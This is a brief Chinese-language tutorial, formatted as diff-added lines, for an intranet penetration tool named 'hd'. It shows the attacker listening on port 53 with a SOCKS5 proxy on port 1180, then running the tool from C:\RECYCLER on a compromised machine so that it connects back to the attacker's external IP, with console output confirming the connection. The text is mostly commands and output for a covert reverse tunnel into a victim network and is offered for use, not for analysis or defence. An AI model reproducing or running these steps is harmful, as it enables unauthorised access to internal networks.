@@ -1,0 +1,15 @@
+最近“凋凌玫瑰”写了一个内网渗透利器---hd，使用方法如下，首先在本机监听：
+c:\>hd -s -listen 53 1180
+[+] Listening ConnectBack Port 53 ......
+[+] Listen OK!
+[+] Listening Socks5 Agent Port 1180 ......
+[+] Listen2 OK!
+[+] Waiting for MainSocket on port:53 ......
+此命令是将连接进来的53端口的数据包连接到1180端口。
+在对方机器上运行:
+C:\RECYCLER>hd -s -connect x.x.x.x 53
+[+] MainSocket Connect to x.x.x.x:53 Success!
+[+] Send Main Command ok!
+[+] Recv Main Command ok!
+[+] Send Main Command again ok!
+上面的x.x.x.x为你的外网ip
